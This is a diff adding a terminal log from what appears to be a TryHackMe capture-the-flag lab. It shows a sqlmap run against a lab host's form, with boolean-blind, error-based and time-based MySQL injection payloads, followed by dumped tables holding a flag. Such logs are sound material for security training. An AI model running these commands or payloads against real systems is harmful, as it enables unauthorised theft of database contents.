@@ -1,0 +1,91 @@
+
+sqlmap --form -u http://10.10.254.24
+
+
+kali@kali:~/TryHackMe/sqlmap$ sqlmap --form -u http://10.10.254.24 --current-db --dump
+        ___
+       __H__                                                                                                        
+ ___ ___["]_____ ___ ___  {1.4.4#stable}                                                                            
+|_ -| . [']     | .'| . |                                                                                           
+|___|_  ["]_|_|_|__,|  _|                                                                                           
+      |_|V...       |_|   http://sqlmap.org                                                                         
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:13:28 /2021-01-12/
+
+[08:13:29] [INFO] testing connection to the target URL
+[08:13:29] [INFO] searching for forms
+[#1] form:
+POST http://10.10.254.24/
+POST data: msg=
+do you want to test this form? [Y/n/q] 
+> y
+Edit POST data [default: msg=] (Warning: blank fields detected): 
+do you want to fill blank fields with random values? [Y/n] y
+[08:13:37] [INFO] using '/home/kali/.sqlmap/output/results-01122021_0813am.csv' as the CSV results file in multiple targets mode
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: msg (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: msg=GNug' RLIKE (SELECT (CASE WHEN (1223=1223) THEN 0x474e7567 ELSE 0x28 END))-- gauR
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: msg=GNug' OR (SELECT 8365 FROM(SELECT COUNT(*),CONCAT(0x7178626271,(SELECT (ELT(8365=8365,1))),0x716b6b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TmGe
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: msg=GNug' AND (SELECT 8751 FROM (SELECT(SLEEP(5)))kpnY)-- hBWU
+---
+do you want to exploit this SQL injection? [Y/n] y
+[08:13:44] [INFO] testing MySQL
+[08:13:44] [WARNING] reflective value(s) found and filtering out
+[08:13:44] [INFO] confirming MySQL
+[08:13:45] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.0
+[08:13:46] [INFO] fetching current database
+[08:13:47] [INFO] retrieved: 'tests'
+current database: 'tests'
+[08:13:47] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[08:13:47] [INFO] fetching current database
+[08:13:47] [INFO] fetching tables for database: 'tests'
+[08:13:47] [INFO] retrieved: 'lol'
+[08:13:47] [INFO] retrieved: 'msg'
+[08:13:47] [INFO] fetching columns for table 'lol' in database 'tests'
+[08:13:48] [INFO] retrieved: 'flag'
+[08:13:48] [INFO] retrieved: 'varchar(100)'
+[08:13:48] [INFO] fetching entries for table 'lol' in database 'tests'
+[08:13:48] [INFO] retrieved: 'found_me'
+Database: tests
+Table: lol
+[1 entry]
++----------+
+| flag     |
++----------+
+| found_me |
++----------+
+
+[08:13:48] [INFO] table 'tests.lol' dumped to CSV file '/home/kali/.sqlmap/output/10.10.254.24/dump/tests/lol.csv'
+[08:13:48] [INFO] fetching columns for table 'msg' in database 'tests'
+[08:13:49] [INFO] retrieved: 'msg'
+[08:13:49] [INFO] retrieved: 'varchar(100)'
+[08:13:49] [INFO] fetching entries for table 'msg' in database 'tests'
+[08:13:50] [INFO] retrieved: 'msg'
+[08:13:50] [INFO] retrieved: 'test'
+Database: tests
+Table: msg
+[2 entries]
++------+
+| msg  |
++------+
+| msg  |
+| test |
++------+
+
+[08:13:50] [INFO] table 'tests.msg' dumped to CSV file '/home/kali/.sqlmap/output/10.10.254.24/dump/tests/msg.csv'
+[08:13:50] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.sqlmap/output/results-01122021_0813am.csv'                                                                                 
+[08:13:50] [WARNING] you haven't updated sqlmap for more than 284 days!!!
+
+[*] ending @ 08:13:50 /2021-01-12/
